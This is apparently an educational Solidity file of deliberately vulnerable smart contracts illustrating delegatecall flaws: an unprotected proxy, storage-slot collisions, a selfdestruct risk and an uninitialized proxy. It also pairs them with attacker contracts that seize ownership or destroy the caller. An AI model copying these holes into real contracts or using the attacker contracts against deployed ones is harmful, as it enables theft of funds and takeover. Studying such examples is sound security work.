// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Delegatecall Vulnerability Examples
 * @dev VULNERABLE - DO NOT USE IN PRODUCTION
 *
 * Delegatecall executes code in the context of the calling contract,
 * which can lead to storage collision and unauthorized access.
 */
contract VulnerableProxy {
    address public owner;  // Slot 0
    address public implementation;  // Slot 1

    constructor(address _implementation) {
        owner = msg.sender;
        implementation = _implementation;
    }

    // VULNERABLE: Unprotected delegatecall
    function forward(bytes memory _data) public {
        // VULNERABILITY: Anyone can delegatecall to any contract
        // Malicious contract can overwrite storage slots
        (bool success, ) = implementation.delegatecall(_data);
        require(success, "Delegatecall failed");
    }

    // VULNERABLE: Delegatecall to user-supplied address
    function execute(address _target, bytes memory _data) public {
        // VULNERABILITY: User controls the target contract
        (bool success, ) = _target.delegatecall(_data);
        require(success, "Execution failed");
    }
}

/**
 * @title Malicious Implementation
 * @dev Contract designed to exploit delegatecall vulnerability
 */
contract MaliciousImplementation {
    address public owner;  // Slot 0 - will overwrite VulnerableProxy.owner
    address public implementation;  // Slot 1

    // This function will overwrite the owner in VulnerableProxy
    function becomeOwner() public {
        owner = msg.sender;
    }

    function destroy() public {
        selfdestruct(payable(msg.sender));
    }
}

/**
 * @title Storage Collision Vulnerability
 * @dev Shows how storage layout mismatches cause vulnerabilities
 */
contract VulnerableWallet {
    address public owner;  // Slot 0
    mapping(address => uint256) public balances;  // Slot 1
    address public libAddress;  // Slot 2

    constructor(address _libAddress) {
        owner = msg.sender;
        libAddress = _libAddress;
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // VULNERABLE: Delegatecall to library with different storage layout
    function withdraw(uint256 _amount) public {
        // VULNERABILITY: If library has different storage layout,
        // it can corrupt this contract's storage
        (bool success, ) = libAddress.delegatecall(
            abi.encodeWithSignature("withdraw(uint256)", _amount)
        );
        require(success, "Withdrawal failed");
    }

    fallback() external payable {
        // VULNERABLE: Fallback forwards all calls to library
        (bool success, ) = libAddress.delegatecall(msg.data);
        require(success, "Fallback failed");
    }
}

/**
 * @title Malicious Library
 * @dev Library with different storage layout that exploits the wallet
 */
contract MaliciousLibrary {
    address public maliciousOwner;  // Slot 0 - will overwrite VulnerableWallet.owner

    function withdraw(uint256 _amount) public {
        // This actually changes the owner!
        maliciousOwner = msg.sender;
        // Could also send funds to attacker
    }

    function setOwner(address _newOwner) public {
        maliciousOwner = _newOwner;
    }
}

/**
 * @title Delegatecall with Selfdestruct
 * @dev Shows how delegatecall can be used to destroy a contract
 */
contract VulnerableRegistry {
    mapping(address => bool) public registered;
    address public logicContract;

    constructor(address _logicContract) {
        logicContract = _logicContract;
    }

    function register() public {
        registered[msg.sender] = true;
    }

    // VULNERABLE: If logic contract has selfdestruct, this contract can be destroyed
    function executeLogic(bytes memory _data) public {
        (bool success, ) = logicContract.delegatecall(_data);
        require(success, "Logic execution failed");
    }
}

/**
 * @title Malicious Logic with Selfdestruct
 * @dev Contract that can destroy the calling contract
 */
contract MaliciousLogic {
    function destroy(address payable _recipient) public {
        // When called via delegatecall, this destroys the calling contract!
        selfdestruct(_recipient);
    }
}

/**
 * @title Uninitialized Proxy
 * @dev Shows initialization vulnerability in proxy pattern
 */
contract UninitializedProxy {
    address public implementation;
    address public owner;
    bool public initialized;

    // VULNERABLE: Constructor doesn't initialize properly
    constructor(address _implementation) {
        implementation = _implementation;
        // Missing: initialized = true and owner = msg.sender
    }

    // VULNERABLE: Can be called by anyone if not initialized
    function initialize(address _owner) public {
        require(!initialized, "Already initialized");
        owner = _owner;
        initialized = true;
    }

    fallback() external payable {
        (bool success, ) = implementation.delegatecall(msg.data);
        require(success, "Delegatecall failed");
    }
}
